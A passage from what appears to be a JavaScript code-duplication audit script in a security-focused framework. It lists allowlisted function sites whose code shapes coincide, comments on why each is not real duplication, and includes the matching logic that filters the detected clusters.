      // DIFFERENT fields (row-policy: schema/table/name/role; view: schema/name/
      // source) with their OWN error class + code. db-declare-row-policy._validateOpts
      // and db-declare-view._validateOpts SHARE A NAME but diverge in fields, so
      // they are NOT a byte-identical dup (verified). validateOpts composition +
      // per-DDL fields, divergent error contracts.
      mode:  "family-subset",
      files: [
        "lib/db-declare-row-policy.js:_validateOpts",
        "lib/db-declare-view.js:_validateOpts",
        "lib/legal-hold.js:place",
        "lib/middleware/db-role-for.js:create",
      ],
    },
    {
      // Module-top require block — shape-only (§9). `var X = require("…"); var {
      // Y } = require("…"); var Z = require("…"); …` — the top-of-file require
      // run that every module shares because they pull in the same core
      // substrate (framework-error / validate-opts / audit / numeric-bounds / C
      // constants / …). The requires MUST stay at top-of-file (§9, cannot be
      // hoisted into a helper), and the SET of modules required is per-file; the
      // `var _ID = require(_STR)` token run is pure language/convention scaffolding.
      mode:  "family-subset",
      files: [
        "lib/agent-idempotency.js:<top>",
        "lib/mail-greylist.js:<top>",
        "lib/mail-server-mx.js:<top>",
        "lib/network-dns-resolver.js:<top>",
      ],
    },
    {
      // Conditional object-assembly idiom — shape-only. `if (src.a) dst.x =
      // src.a; if (src.b) dst.y = src.b; …` — building an output object by
      // copying truthy fields — recurs across unrelated builders with entirely
      // different field sets: a2a agent-card assembly, AsyncAPI channel /
      // message normalisation, an AsyncAPI Kafka binding, a mail resend-transport
      // config, an OAuth protected-resource-metadata document. The copy-if-truthy
      // token run coincides; the fields and the surrounding builder are
      // domain-specific with no shared primitive (a generic helper would be
      // Object.assign-with-a-truthy-filter, language idiom not domain logic).
      mode:  "family-subset",
      files: [
        "lib/a2a.js:createCard",
        "lib/asyncapi-bindings.js:kafka",
        "lib/asyncapi.js:_addChannel",
        "lib/asyncapi.js:_normaliseMessage",
        "lib/mail.js:resendTransport",
        "lib/middleware/protected-resource-metadata.js:create",
        // fp:1b2c03342fcd — the object-store signing/request functions
        // (azure-blob._buildSasToken / gcs.presignedUploadPolicy /
        // sigv4.presignedUploadPolicy) build signed SAS-token params / presigned
        // POST-policy fields with the same `if (opts.x) target[k] = opts.x` copy-if-
        // present run; the fields (SAS permissions/expiry vs POST policy conditions)
        // are domain-specific signing surfaces. The shared key + expiry-bounds (+
        // upload-policy byte-bounds) validation preamble these three opened with —
        // a genuine 3-backend dup — is now extracted to
        // sharedRequest.requirePresignKey / resolvePresignExpires /
        // resolvePresignUploadMinBytes; only the copy-if-present signing assembly
        // remains, which is shape-only. The getResponse conditional-GET sub-dup
        // (the RFC 7232/7233 If-Match family headers + the response-object
        // mapping + the 304 short-circuit, byte-identical across azure/gcs/sigv4
        // getResponse) is now ALSO extracted to
        // sharedRequest.applyConditionalGetHeaders / mapGetResponse /
        // notModifiedGetResult — the Range header NAME (Range vs x-ms-range) is
        // the one parameter.
        "lib/object-store/azure-blob.js:_buildSasToken",
        "lib/object-store/gcs.js:presignedUploadPolicy",
        "lib/object-store/sigv4.js:presignedUploadPolicy",
        // fp:1b2c03342fcd attributed site set — the head() functions across the
        // backends carry the same versionId/range copy-if-present signing run
        // (shape-only, per-backend signers). Their byte-identical
        // { size, etag, lastModified } response projection is now extracted to
        // sharedRequest.mapHeadResponse (azure / sigv4 / http-put); gcs.head is
        // NOT a member — it parses a JSON metadata body, not response headers.
        "lib/object-store/azure-blob.js:head",
        "lib/object-store/http-put.js:head",
        "lib/object-store/sigv4.js:head",
      ],
    },
    {
      // Unconditional object-literal facade assembly — shape-only. fp:3262c57c8e77
      // is the UNCONDITIONAL sibling of the conditional idiom above: a long
      // `{ name: source.member, name: source.member, … }` object literal that maps
      // many names to a member of a source — the framework's facade/re-export shape.
      // middleware/index's `module.exports = { requestId: requestId.create,
      // securityHeaders: securityHeaders.create, … }` re-exports every middleware's
      // .create; guard-all._resolveActiveGuards maps guard names to guard members;
      // websocket-channels.create assembles the channels API object. The
      // `{ k: x.y, … }` token run coincides; the names + sources are entirely
      // domain-specific facade mappings — a facade is not extractable into a shared
      // primitive (the mapping IS the per-module surface).
      mode:  "family-subset",
      files: [
        "lib/guard-all.js:_resolveActiveGuards",
        "lib/middleware/index.js:<top>",
        "lib/websocket-channels.js:create",
      ],
    },
    {
      // Audit-emit OPERATOR-SINK variant — shape-only. fp:193cd300dfa4: a private
      // `function _emitAudit(action, …) { try { var audit = opts.audit || audit();
      // if (audit && typeof audit.safeEmit === "function") audit.safeEmit({ action,
      // outcome, metadata: {}, … }); } catch {} }` wrapper that falls back from an
      // operator-supplied opts.audit sink to the framework audit() — the audit-
      // verbatim-emit pass DELIBERATELY left the opts.audit-operator-sink form
      // per-caller (it is NOT b.audit.namespaced, which is gated + uses the framework
      // sink only — see project_knownclusters_rebuild_emitaudit). The 60-tok shingle
      // starts at the preceding fn's close + spans this wrapper, so _siteSetOf
      // attributes it to the preceding helper (pgp._padTo32 / smime.checkCert /
      // mail-deploy._collectAndProcess — first-occurrence per file). Shape-only:
      // operator-sink audit wrapper, intentionally per-caller.
      mode:  "family-subset",
      files: [
        "lib/mail-crypto-pgp.js:_padTo32",
        "lib/mail-crypto-smime.js:checkCert",
        "lib/mail-deploy.js:_collectAndProcess",
      ],
    },
    {
      // copy-defined-keys / verify-opts assembly — shape-only. `if (src.k !==
      // undefined) dst.k = src.k` repeated for a small fixed key set is a generic
      // mechanical idiom that recurs in the JOSE sign/verify paths (dpop / fido-
      // mds3 / jwt-external / oauth assemble a node:crypto verify-params object —
      // padding / saltLength / dsaEncoding) AND, coincidentally, in mail-auth's
      // DKIM verify-opts assembly (clockSkewMs / maxSignatures / minRsaBits) —
      // entirely unrelated key sets in unrelated security contexts. The token
      // shape coincides; the surrounding logic diverges materially (the prior
      // JOSE pass extracted the shared alg→param TABLE as jwtExternal.algParams
      // and DELIBERATELY kept the verify-ASSEMBLY per-caller because the
      // node:crypto.verify call, key shape — PQC/EdDSA bare-key vs classical
      // {key} — sign-vs-verify, and error classes all diverge). A generic
      // copy-defined-keys micro-helper would add an indirection to security-
      // critical signature-verification code (a reviewer auditing the RSA-PSS
      // saltLength would have to follow it) for a 3-line DRY win — inline clarity
      // wins here. The 1-2 key single-`if` sites are below the cluster threshold.
      mode:  "family-subset",
      files: [
        "lib/auth/dpop.js:buildProof",
        "lib/auth/dpop.js:verify",
        "lib/auth/fido-mds3.js:_verifyJws",
        "lib/auth/jwt-external.js:_signCompactJws",
        "lib/auth/jwt-external.js:verifyExternal",
        "lib/auth/oauth.js:_verifyAttestationJws",
        "lib/auth/oauth.js:verifyIdToken",
        "lib/mail-auth.js:inboundVerify",
      ],
    },
    {
      // Array-filter loop idiom — shape-only. `var out = []; for (var i = 0; i <
      // arr.length; i += 1) { var item = arr[i]; if (typeof item !== "string" ||
      // item.length === 0) <skip>; … }` — the index-loop + per-element string
      // guard recurs across six unrelated bodies that then do entirely different
      // things with the surviving elements: client-hints builds an accept-list,
      // csp assembles a directive, mail-spam-score sanitizes reason strings,
      // router compiles a path match, sandbox validates an allow-list, watcher
      // compiles ignore globs. Only the loop skeleton coincides; the per-element
      // logic is domain-specific with no shared primitive. (The `typeof item !==
      // "string" || item.length === 0` element guard is the requireNonEmptyString
      // shape in a filter context — char-empty, not a byte cap.)
      mode:  "family-subset",
      files: [
        "lib/auth/bot-challenge.js:_normaliseAllowlist",
        "lib/auth/oid4vci.js:_parseX5cChain",
        "lib/client-hints.js:acceptList",
        "lib/csp.js:build",
        "lib/mail-spam-score.js:_sanitizeReasons",
        "lib/middleware/cors.js:create",
        "lib/middleware/require-content-type.js:_normalizeAllowed",
        "lib/network-dns.js:setServers",
        "lib/router.js:_matchCompiled",
        "lib/sandbox.js:_validateAllowed",
        "lib/watcher.js:_compileIgnore",
      ],
    },
    {
      // Content-guard family scaffolding + detect/disposition/scan — shape-only.
      // Same mixed-site situation as the command/mail and agent guard families:
      // the content guards (email / json / xml / yaml / markdown / html / svg /
      // csv / text) share 50-60-tok shingles across their <top> scaffolding,
      // their _detectIssues / _scan* / validate* detection bodies, their
      // _sanitizeTransform / sanitize transforms, their _gateDispositionFor
      // policy maps, and their `gate` (buildContentGate composition) — clusters
      // span several of these at once, so one entry must cover the whole family.
      // Each piece is independently shape-only: <top> = §9 + extracted-primitive
      // composition; _detect* / _scan* / validate* / _allMatches = per-FORMAT
      // detection grammar (email RFC 5322 vs JSON vs YAML anchors vs markdown
      // links — unrelated, the same verdict as the _detectIssues family);
      // _sanitizeTransform / sanitize = per-format repair; _gateDispositionFor =
      // each guard's EXHAUSTIVE policy→disposition map (csv dangerous-functions
      // vs html script-tags vs json prototype-pollution — divergent, not
      // byte-identical); gate = buildContentGate composition. No two bodies are
      // byte-identical (the genuine shared constants — DANGEROUS/SAFE_URL_SCHEMES,
      // CHAR_THREATS_REJECT_ALL — are already extracted).
      mode:  "family-subset",
      files: [
        "lib/guard-csv.js:_gateDispositionFor",
        "lib/guard-email.js:_detectAddressIssues",
        "lib/guard-email.js:_detectMessageIssues",
        "lib/guard-email.js:_parseAddressLine",
        "lib/guard-email.js:validateAddress",
        "lib/guard-html.js:_gateDispositionFor",
        "lib/guard-html.js:_permissiveAllowed",
        "lib/guard-html.js:gate",
        "lib/guard-html.js:sanitize",
        "lib/guard-json.js:<top>",
        "lib/guard-json.js:_detectIssues",
        "lib/guard-json.js:_gateDispositionFor",
        "lib/guard-json.js:_scanRawSource",
        "lib/guard-json.js:gate",
        "lib/guard-markdown.js:_allMatches",
        "lib/guard-markdown.js:_detectIssues",
        "lib/guard-markdown.js:_gateDispositionFor",
        "lib/guard-markdown.js:_sanitizeTransform",
        "lib/guard-shell.js:_detectIssues",
        "lib/guard-svg.js:<top>",
        "lib/guard-svg.js:_gateDispositionFor",
        "lib/guard-svg.js:sanitize",
        "lib/guard-text.js:<top>",
        "lib/guard-xml.js:<top>",
        "lib/guard-xml.js:_detectIssues",
        "lib/guard-xml.js:_gateDispositionFor",
        "lib/guard-xml.js:_sanitizeTransform",
        "lib/guard-xml.js:gate",
        "lib/guard-yaml.js:<top>",
        "lib/guard-yaml.js:_detectIssues",
        "lib/guard-yaml.js:_scanTags",
        "lib/guard-yaml.js:parse",
      ],
    },
    {
      // Agent / identifier-guard family scaffolding + preamble — shape-only.
      // Same situation as the command/mail-guard family below: these agent and
      // structured-identifier guards (agent-registry / event-bus-topic /
      // event-bus-payload / saga-config / snapshot-envelope / tenant-id /
      // trace-context / idempotency-key / message-id) are structurally
      // near-identical, so a 50-tok shingle recurs across their <top> scaffolding
      // (require block + PROFILES + makeProfileResolver/buildGuardGate
      // composition) AND their validate / _checkName bodies, producing clusters
      // whose sites span both. One entry must cover a cluster's whole mixed site
      // set. Each piece is independently shape-only: <top> = §9 require + the
      // extracted-primitive composition; validate = object-input preamble +
      // makeProfileResolver (posture precedence); _checkName = identifier-name
      // validation preamble with each guard's OWN error class / code / RESERVED
      // prefixes / dot-count rules (the b5f63d71b320 preamble class). No two
      // bodies are byte-identical (the _checkName family was verified divergent).
      mode:  "family-subset",
      files: [
        "lib/guard-agent-registry.js:<top>",
        "lib/guard-agent-registry.js:_checkName",
        "lib/guard-agent-registry.js:validate",
        "lib/guard-event-bus-payload.js:validate",
        "lib/guard-event-bus-topic.js:<top>",
        "lib/guard-event-bus-topic.js:validate",
        "lib/guard-idempotency-key.js:validate",
        "lib/guard-mail-move.js:<top>",
        "lib/guard-mail-move.js:validate",
        "lib/guard-mail-sieve.js:_checkName",
        "lib/guard-message-id.js:validate",
        "lib/guard-saga-config.js:<top>",
        "lib/guard-saga-config.js:validate",
        "lib/guard-snapshot-envelope.js:<top>",
        "lib/guard-snapshot-envelope.js:validate",
        "lib/guard-tenant-id.js:<top>",
        "lib/guard-tenant-id.js:validate",
        "lib/guard-trace-context.js:<top>",
        "lib/guard-trace-context.js:validate",
      ],
    },
    {
      // Command / mail-guard family scaffolding + preamble — shape-only. These
      // line-protocol and mail guards are structurally near-identical (a 50-tok
      // shingle recurs across their module-top require/verb-table/profile-gate
      // scaffolding AND their validate / field-check bodies), so a single cluster
      // spans BOTH <top> sites AND validate/_check sites within the same file
      // set. The family-subset matcher needs ONE entry covering a cluster's whole
      // mixed site set, so this entry enumerates every clustering function of the
      // family. Each piece is independently shape-only: <top> = §9 require block +
      // per-protocol verb/keyword SET (IMAP≠POP3≠ManageSieve verbs, irreducible
      // domain data) + the strictDefaults/compliancePostures/makeProfileResolver
      // composition (already the extracted primitives); validate = the
      // opts-default → resolveProfile → caps preamble (composes makeProfileResolver,
      // posture precedence); _checkAddrList/_checkBody/_checkName/validateActor =
      // the input-validation preamble class (object-input / requireNonEmptyString
      // with each guard's OWN error class + code + message). The protocol-specific
      // validate LOGIC is NOT shared (verified: imap/pop3 share only scaffolding
      // shingles, none inside validate); no two bodies are byte-identical.
      mode:  "family-subset",
      files: [
        "lib/guard-imap-command.js:<top>",
        "lib/guard-imap-command.js:validate",
        "lib/guard-jmap.js:<top>",
        "lib/guard-jmap.js:validate",
        "lib/guard-list-id.js:<top>",
        "lib/guard-mail-compose.js:<top>",
        "lib/guard-mail-compose.js:_checkAddrList",
        "lib/guard-mail-compose.js:_checkBody",
        "lib/guard-mail-compose.js:validate",
        "lib/guard-mail-query.js:<top>",
        "lib/guard-mail-query.js:validateActor",
        "lib/guard-mail-reply.js:<top>",
        "lib/guard-mail-reply.js:validate",
        "lib/guard-mail-sieve.js:<top>",
        "lib/guard-mail-sieve.js:_checkName",
        "lib/guard-mail-sieve.js:validate",
        "lib/guard-managesieve-command.js:<top>",
        "lib/guard-managesieve-command.js:validate",
        "lib/guard-pop3-command.js:<top>",
        "lib/guard-pop3-command.js:validate",
        "lib/guard-posture-chain.js:<top>",
        "lib/guard-posture-chain.js:validate",
        "lib/guard-smtp-command.js:<top>",
        "lib/guard-smtp-command.js:validate",
        "lib/guard-stream-args.js:<top>",
        "lib/guard-stream-args.js:validate",
      ],
    },
    {
      // Long string-literal ARRAY — `Object.freeze([ "a", "b", "c", … ])` —
      // shape-only. A run of 10+ string literals normalises to the same
      // `[ _STR , _STR , … ]` token shingle regardless of CONTENT, so unrelated
      // domain data collides: archive/json/xml/yaml/text MIME_TYPES + EXTENSIONS,
      // guard-html's permissive-tag universe, guard-email's address-char set,
      // guard-filename's reserved-name list. The two genuinely byte-identical
      // arrays that DID hide in this collision — the markup dangerous-scheme
      // denylist and the safe-scheme allowlist shared by guard-html / guard-svg —
      // are already extracted to gateContract.DANGEROUS_URL_SCHEMES /
      // SAFE_URL_SCHEMES (their own inverse detectors, allowlisted to
      // gate-contract.js). Every remaining array was cross-checked for content
      // overlap and found per-domain unique. Object.freeze + the literal IS the
      // primitive; the membership list is irreducible domain data.
      mode:  "family-subset",
      files: [
        "lib/guard-archive.js:<top>",
        "lib/guard-email.js:_parseAddressLine",
        "lib/guard-filename.js:<top>",
        "lib/guard-html.js:_permissiveAllowed",
        "lib/guard-json.js:<top>",
        "lib/guard-svg.js:<top>",
        "lib/guard-text.js:<top>",
        "lib/guard-xml.js:<top>",
        "lib/guard-yaml.js:<top>",
      ],
    },
    {
      // Frozen keyword/verb SET — `Object.freeze({ FOO: true, BAR: true, … })` —
      // shape-only. The STRUCTURE (a run of `name: true` membership flags)
      // repeats, but the CONTENT is per-domain data with no overlap: IMAP4rev2
      // verbs (RFC 9051) vs POP3 vs ManageSieve vs SMTP verbs vs SQL CTE keywords
      // vs iCal/vCard property names. Object.freeze IS the primitive; the membership
      // table is irreducible domain data, not extractable shared logic. The
      // `name: true` token run also coincidentally collides with object literals
      // built inside unrelated SQL functions (sql.js:dropPolicy assembles a
      // `{ quoteName: true, … }`-shaped policy options object) — same token
      // shape, no shared logic.
      mode:  "family-subset",
      files: [
        "lib/external-db.js:_cteMainKeyword",
        "lib/guard-imap-command.js:<top>",
        "lib/guard-managesieve-command.js:<top>",
        "lib/guard-pop3-command.js:<top>",
        "lib/guard-smtp-command.js:<top>",
        "lib/guard-sql.js:<top>",
        "lib/safe-ical.js:<top>",
        "lib/safe-vcard.js:<top>",
        "lib/sql.js:dropPolicy",
      ],
    },
    {
      // Guard _detectIssues policy-dispatch — shape-only. The shared shape is
      // `if (opts.<x>Policy !== "allow" && <RE>.test(input)) issues.push({ kind,
      // severity: opts.<x>Policy === "reject" ? "high" : "warn" })`, but each
      // guard's detection GRAMMAR is unrelated: email address parsing vs jsonpath
      // operators vs regex ReDoS shapes vs shell metacharacters vs template
      // injection vs XML XXE vs YAML anchors. Templating the bodies would couple
      // unrelated security grammars; only the push-with-severity shape coincides.
      mode:  "family-subset",
      files: [
        "lib/guard-cidr.js:_detectIssues",
        "lib/guard-email.js:_detectAddressIssues",
        "lib/guard-email.js:_detectMessageIssues",
        "lib/guard-filename.js:_detectIssues",
        "lib/guard-graphql.js:_detectIssues",
        "lib/guard-image.js:_detectIssues",
        "lib/guard-json.js:_detectIssues",
        "lib/guard-jsonpath.js:_detectIssues",
        "lib/guard-jwt.js:_detectIssues",
        "lib/guard-markdown.js:_detectIssues",
        "lib/guard-mime.js:_detectIssues",
        "lib/guard-oauth.js:_detectIssues",
        "lib/guard-pdf.js:_detectIssues",
        "lib/guard-regex.js:_detectIssues",
        "lib/guard-shell.js:_detectIssues",
        "lib/guard-template.js:_detectIssues",
        "lib/guard-time.js:_detectIssues",
        "lib/guard-uuid.js:_detectIssues",
        "lib/guard-xml.js:_detectIssues",
        "lib/guard-yaml.js:_detectIssues",
        "lib/middleware/headers.js:_detectIssues",
        // fp:478bd8475cc2 — the SAME _detectIssues policy-dispatch preamble, but
        // the 60-tok shingle spans the closing brace of the PRECEDING helper plus
        // the identical `function _detectIssues(input, opts) { var pre =
        // gateContract.detectStringInput(...); if (pre.done) return pre.issues; var
        // issues = pre.issues; }` opener — so _siteSetOf (first-occurrence) attributes
        // it to the preceding function (_ipv6InReservedRange / _splitTopLevel /
        // _toCanonicalHex — unrelated IPv6-range / MIME-split / UUID-hex helpers).
        // Same shape-only detectStringInput-consumer scaffolding, attributed one
        // function up by the tokenizer.
        "lib/guard-cidr.js:_ipv6InReservedRange",
        "lib/guard-mime.js:_splitTopLevel",
        "lib/guard-uuid.js:_toCanonicalHex",
      ],
    },
    {
      // Guard _sanitizeTransform — shape-only. defineGuard's generated sanitize
      // runs resolve → detect → throw-on-refusal, then applies this per-guard
      // normalize to the already-validated input. The transforms are entirely
      // domain-specific (guard-cidr lowercases IPv6 groups + canonical mask;
      // guard-domain canonicalises labels; guard-time normalises an instant; …).
      // The `function _sanitizeTransform(input) { … }` shape coincides; the body
      // is irreducible per-guard logic.
      mode:  "family-subset",
      files: [
        "lib/guard-cidr.js:_sanitizeTransform",
        "lib/guard-domain.js:_sanitizeTransform",
        "lib/guard-jsonpath.js:_sanitizeTransform",
        "lib/guard-markdown.js:_sanitizeTransform",
        "lib/guard-mime.js:_sanitizeTransform",
        "lib/guard-shell.js:_sanitizeTransform",
        "lib/guard-template.js:_sanitizeTransform",
        "lib/guard-time.js:_sanitizeTransform",
        "lib/guard-uuid.js:_sanitizeTransform",
        "lib/guard-xml.js:_sanitizeTransform",
      ],
    },
    {
      // Factory create(opts) preamble — shape-only convention. Every b.<ns>.create
      // factory opens by composing the extracted opts-contract primitives —
      // `validateOpts.requireObject(opts, "<ns>", <Error>); validateOpts(opts,
      // [<allowed keys>]); …` — before its own per-factory wiring. The allowed-key
      // list and the construction logic are per-factory; the validateOpts
      // composition is correct shared usage, already routed through the primitive.
      mode:  "family-subset",
      files: [
        "lib/agent-orchestrator.js:create",
        "lib/agent-snapshot.js:create",
        "lib/agent-tenant.js:create",
        "lib/api-key.js:create",
        "lib/asyncapi.js:create",
        "lib/auth-bot-challenge.js:create",
        "lib/auth/access-lock.js:create",
        "lib/auth/sd-jwt-vc-issuer.js:create",
        "lib/backup/bundle.js:create",
        "lib/backup/index.js:create",
        "lib/cert.js:create",
        "lib/compliance-eaa.js:create",
        "lib/compliance-sanctions-fetcher.js:create",
        "lib/compliance-sanctions.js:create",
        "lib/config.js:create",
        "lib/ddl-change-control.js:create",
        "lib/dsr.js:create",
        "lib/dual-control.js:create",
        "lib/file-upload.js:create",
        "lib/gdpr-ropa.js:create",
        "lib/http-client-cache.js:create",
        "lib/incident-report.js:create",
        "lib/mail-dkim.js:create",
        "lib/mail-greylist.js:create",
        "lib/mail-journal.js:create",
        "lib/mail-rbl.js:create",
        "lib/mail-scan.js:create",
        "lib/mail-server-imap.js:create",
        "lib/mail-server-managesieve.js:create",
        "lib/mail-server-mx.js:create",
        "lib/mail-server-pop3.js:create",
        "lib/mail-server-submission.js:create",
        "lib/mail-spam-score.js:create",
        "lib/middleware/assetlinks.js:create",
        "lib/middleware/bearer-auth.js:create",
        "lib/middleware/cors.js:create",
        "lib/middleware/db-role-for.js:create",
        "lib/middleware/dpop.js:create",
        "lib/middleware/host-allowlist.js:create",
        "lib/middleware/no-cache.js:create",
        "lib/middleware/protected-resource-metadata.js:create",
        "lib/middleware/require-auth.js:create",
        "lib/middleware/require-bound-key.js:create",
        "lib/middleware/require-content-type.js:create",
        "lib/middleware/require-methods.js:create",
        "lib/middleware/security-headers.js:create",
        "lib/middleware/security-txt.js:create",
        "lib/middleware/span-http-server.js:create",
        "lib/middleware/tus-upload.js:create",
        "lib/middleware/web-app-manifest.js:create",
        "lib/observability-otlp-exporter.js:create",
        "lib/observability-tracer.js:create",
        "lib/openapi.js:create",
        "lib/outbox.js:create",
        "lib/pubsub-cluster.js:create",
        "lib/queue-sqs.js:create",
        "lib/seeders.js:create",
        "lib/static.js:create",
        "lib/template.js:create",
        "lib/websocket-channels.js:create",
      ],
    },
    {
      // Guard gate() / _gateDispositionFor() / sanitize() — shape-only. The gate
      // entry points uniformly compose the extracted gate-contract primitives
      // (gateContract.buildGuardGate / severityDisposition / buildContentGate);
      // each guard's _gateDispositionFor is its own exhaustive per-issue policy
      // map and each sanitize() its own transform. Correct composition + per-guard
      // policy data, not duplication.
      mode:  "family-subset",
      files: [
        "lib/guard-auth.js:gate",
        "lib/guard-graphql.js:gate",
        "lib/guard-html.js:gate",
        "lib/guard-image.js:gate",
        "lib/guard-json.js:gate",
        "lib/guard-oauth.js:gate",
        "lib/guard-pdf.js:gate",
        "lib/guard-regex.js:gate",
        "lib/guard-xml.js:gate",
        "lib/guard-csv.js:_gateDispositionFor",
        "lib/guard-html.js:_gateDispositionFor",
        "lib/guard-json.js:_gateDispositionFor",
        "lib/guard-markdown.js:_gateDispositionFor",
        "lib/guard-svg.js:_gateDispositionFor",
        "lib/guard-xml.js:_gateDispositionFor",
        "lib/guard-filename.js:sanitize",
        "lib/guard-html.js:sanitize",
        "lib/guard-svg.js:sanitize",
      ],
    },
    {
      // Array-of-non-empty-strings loop — shape-only. `for (i…) { if (typeof
      // X[i] !== "string" || X[i].length === 0) throw <ownError>(<ownCode>,
      // <domainMsg>) }` validates each element of an array argument. The loop
      // shape coincides; the array (expectedOrigin / CSP sources / address list /
      // folder names / …), the error class/code, and the message are per-site.
      mode:  "family-subset",
      files: [
        "lib/auth/passkey.js:_validateExpectedOrigin",
        "lib/auth/step-up.js:_quote",
        "lib/client-hints.js:acceptList",
        "lib/csp.js:build",
        "lib/guard-idempotency-key.js:validate",
        "lib/guard-mail-compose.js:_checkAddrList",
        "lib/guard-mail-move.js:_checkFolderName",
        "lib/guard-message-id.js:validate",
        "lib/mail-arc-sign.js:sign",
        "lib/mail-spam-score.js:_sanitizeReasons",
        "lib/middleware/bearer-auth.js:create",
        "lib/middleware/require-methods.js:create",
        "lib/network-tls.js:buildOptions",
        "lib/router.js:_matchCompiled",
        "lib/sandbox.js:_validateAllowed",
        "lib/watcher.js:_compileIgnore",
        "lib/ws-client.js:connect",
      ],
    },
    {
      // validateOpts optional-field chain — shape-only convention. A run of
      // `validateOpts.optionalBoolean / optionalFunction / optionalNonEmptyString
      // / optionalPositiveInt(opts.<k>, "<label>", <Error>, "<code>")` calls in a
      // factory's create()/build() opts validation. Every call composes the
      // extracted validateOpts primitive (correct shared usage); the field set
      // and labels are per-factory.
      mode:  "family-subset",
      files: [
        "lib/auth/jar.js:build",
        "lib/http-client-cache.js:create",
        "lib/http-client.js:_validateDownloadOpts",
        "lib/middleware/db-role-for.js:create",
        "lib/middleware/dpop.js:create",
        "lib/middleware/no-cache.js:create",
        "lib/middleware/tus-upload.js:create",
        "lib/outbox.js:create",
        "lib/pubsub-cluster.js:create",
        "lib/vault/seal-pem-file.js:sealPemFile",
        "lib/watcher.js:_validateOpts",
      ],
    },
  ];
  // Each KNOWN_CLUSTERS entry's `files` is a list of `path:fn` strings.
  // Build per-entry matchers and reject malformed entries (bare path
  // with no `:fn` qualifier) at parse time so the audit trail records
  // exactly which body of code shares the shape.
  //
  // Migration bypass: HS_CLUSTER_MIGRATE=1 in the env relaxes the
  // bare-path rejection so the detector can run against unmigrated
  // entries; in that mode every detected strong cluster is dumped
  // as `MIGRATE-DUMP <files-sorted>::<file:fn>,...` so the operator
  // can rewrite the entries.
  var MIGRATE_MODE = !!process.env.HS_CLUSTER_MIGRATE;
  function _parseEntryMatchers(entry, idx) {
    var matchers = [];
    var seen = Object.create(null);
    for (var i = 0; i < entry.files.length; i += 1) {
      var raw = entry.files[i];
      if (typeof raw !== "string" || raw.length === 0) {
        throw new Error("KNOWN_CLUSTERS[" + idx + "].files[" + i +
          "] must be a non-empty string in `path:fnName` form");
      }
      var colon = raw.lastIndexOf(":");
      if (colon === -1) {
        if (MIGRATE_MODE) {
          // Bare path under migration mode — treat fn as `*` so it
          // matches anything; the dump output below shows the operator
          // what the real fn name is.
          matchers.push({ file: raw, fn: "*" });
          continue;
        }
        throw new Error("KNOWN_CLUSTERS[" + idx + "].files[" + i +
          "] = " + JSON.stringify(raw) +
          " — missing `:fnName` qualifier. Allowlist entries must " +
          "name the function whose body shares the duplicate shape. " +
          "Use `<top>` for module-level code.");
      }
      var file = raw.slice(0, colon);
      var fn   = raw.slice(colon + 1);
      if (file.length === 0 || fn.length === 0) {
        throw new Error("KNOWN_CLUSTERS[" + idx + "].files[" + i +
          "] = " + JSON.stringify(raw) +
          " — empty path or fn after splitting on `:`");
      }
      var key = file + ":" + fn;
      if (seen[key]) continue;
      seen[key] = true;
      matchers.push({ file: file, fn: fn });
    }
    return matchers;
  }

  var _exactEntries = [];        // mode unset → cluster's siteSet must equal entry's matcher set
  var _familyEntries = [];       // mode:"family-subset" → every cluster site covered by ≥1 matcher
  KNOWN_CLUSTERS.forEach(function (e, idx) {
    var matchers = _parseEntryMatchers(e, idx);
    if (e.mode === "family-subset") _familyEntries.push(matchers);
    else _exactEntries.push(matchers);
  });

  // Compute (file, fn) site set per cluster — unique per file, the
  // first occurring line in each file decides the enclosing function.
  // Multiple sites in the same file under different functions are
  // each represented as a separate (file, fn) tuple.
  function _siteSetOf(r) {
    var seen = Object.create(null);
    var out = [];
    for (var i = 0; i < r.sites.length; i += 1) {
      var s = r.sites[i];
      var fn = _enclosingFn(s.file, s.line);
      var key = s.file + ":" + fn;
      if (seen[key]) continue;
      seen[key] = true;
      out.push({ file: s.file, fn: fn });
    }
    return out;
  }
  function _siteCoveredBy(site, matchers) {
    for (var i = 0; i < matchers.length; i += 1) {
      if (matchers[i].file !== site.file) continue;
      if (matchers[i].fn === "*") return true;          // migration-mode wildcard
      if (matchers[i].fn === site.fn) return true;
    }
    return false;
  }

  var strong = rows.filter(function (r) {
    if (r.passLabel !== "[exact]") return false;
    if (r.bestSize < STRONG_MIN_SIZE) return false;
    if (r.fileSet.length < STRONG_MIN_FILES) return false;

    var siteSet = _siteSetOf(r);

    // Always dump every strong cluster's (file, fn) tuples so the
    // operator can rewrite KNOWN_CLUSTERS entries from the log
    // without re-running with HS_CLUSTER_MIGRATE=1. Format:
    //   MIGRATE-DUMP <sorted-fileset> :: <file:fn>,<file:fn>,...
    // The env flag still controls whether bare-path KNOWN_CLUSTERS
    // entries are accepted (line ~3050) — the dump is purely
    // diagnostic and runs unconditionally.
    var fileKey = r.fileSet.slice().sort().join("|");
    var siteKey = siteSet.map(function (s) { return s.file + ":" + s.fn; }).sort().join(",");
    console.log("MIGRATE-DUMP " + fileKey + " :: " + siteKey);

    // Exact match: cluster siteSet must equal one entry's matcher set
    // (every site covered AND every matcher used by some site).
    for (var ei = 0; ei < _exactEntries.length; ei += 1) {
      var matchers = _exactEntries[ei];
      if (matchers.length !== siteSet.length) continue;
      var allCovered = true;
      for (var sj = 0; sj < siteSet.length; sj += 1) {
        if (!_siteCoveredBy(siteSet[sj], matchers)) { allCovered = false; break; }
      }
      if (!allCovered) continue;
      // Also ensure every matcher hit at least one site (so an entry
      // can't drift into "matches everything" by accident).
      var allUsed = true;
      for (var mi = 0; mi < matchers.length; mi += 1) {
        var hit = false;
        for (var sk = 0; sk < siteSet.length; sk += 1) {
          if (siteSet[sk].file === matchers[mi].file && siteSet[sk].fn === matchers[mi].fn) {
            hit = true; break;
          }
        }
        if (!hit) { allUsed = false; break; }
      }
      if (allUsed) return false;
    }

    // Family-subset: every site is covered by at least one matcher.
    // Used for the guard-* family ABI clusters where adding one new
    // guard creates O(2^N) new file-set combinations.
    for (var fi2 = 0; fi2 < _familyEntries.length; fi2 += 1) {
      var fmatchers = _familyEntries[fi2];
      var fAll = true;
      for (var fj = 0; fj < siteSet.length; fj += 1) {
        if (!_siteCoveredBy(siteSet[fj], fmatchers)) { fAll = false; break; }
      }
      if (fAll) return false;
    }
    return true;
  });
  // Only the strong-signal cluster is a primitive-extraction
  // candidate. The weak-tier inventory (smaller shingles, skeleton-
  // shape matches) was tuned out — it surfaced JS / framework
  // language idiom that can't be extracted (every file's constant
  // declarations, function signatures, module exports). Keeping only
  // the strong signal as a hard gate.
  if (strong.length > 0) {
    var strongMatches = strong.map(function (r) {
      var first = r.sites[0];
